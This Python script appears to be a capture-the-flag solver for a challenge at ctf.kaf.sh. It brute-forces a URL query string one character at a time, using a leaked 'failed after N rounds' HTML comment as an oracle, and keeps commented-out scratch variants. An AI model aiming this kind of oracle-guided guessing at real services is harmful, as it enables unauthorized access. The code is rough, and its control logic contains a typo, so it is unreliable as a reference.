import requests
import urllib3
import string
import urllib
import re
urllib3.disable_warnings()

u='http://ctf.kaf.sh:1050/scripts/page/?'

while True:
    for i in string.ascii_letters+string.digits:
        current = ""
        rounds = 0
        payload = i
        
        lists = [j for j in string.ascii_letters+string.digits]

#        starting_list = []
#        for item in lists:
#            r = requests.get(u + item)
#            fail_msg = re.findall('<!-- failed after [0-9]+ rounds',r.text)[0]
#            num_of_rounds = int(re.findall('[0-9]+',fail_msg)[0])
#            if num_of_rounds > 0:
#                starting_list.append(item)
#
        starting_list = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

        print(starting_list)
        for start in starting_list:
            for digit in range(len(string.ascii_letters)):
                attemp = start
                reached_end = False
                list_to_do = string.ascii_letters
                for j in list_to_do:
                    if reached_end:
                        continue
                    attemp += j
                    r = requests.get(u + attemp)
                    if 'OK' in r.text:
                        #print("Found one guy = " ,attemp)
                        print("=====================================================  success = ", attemp)
                    else:
                        fail_msg = re.findall('<!-- failed after [0-9]+ rounds',r.text)[0]
                        print("failed ", fail_msg)
                        print("payload = ", attemp)
                        num_of_rounds = int(re.findall('[0-9]+',fail_msg)[0])
                        if num_of_rounds == 0:
                            attempt = attemp[:-1]
                            reached_end = True
                            break
                        if len(attemp) > num_of_rounds+2:
                            attemp = payload
                            reached_end = True
                            break
                        if len(attemp) == num_of_rounds:
                            continue
                        else:
                            attemp = attemp[:-1]
                else:
                    break



#
#
#
#        for c in string.ascii_letters+string.digits:
#
#            r = requests.get(u + attemp)
#            if 'OK' in r.text:
#                print("Found one guy = " ,attemp)
#                print("=====================================================  success = ", attemp)
#            else:
#                fail_msg = re.findall('<!-- failed after [0-9]+ rounds',r.text)[0]
#                print("failed ", fail_msg)
#                print("payload = ", attemp)
#                num_of_rounds = int(re.findall('[0-9]+',fail_msg)[0])
#                if num_of_rounds == 0:
#                    attemp = payload
#                    break
#                if len(attemp) > num_of_rounds+2:
#                    attemp = payload
#                    break
#                if len(attemp) == num_of_rounds:
#                    continue
#                else:
#                    attemp = attemp[:-1]
#
#
#            attemp += c
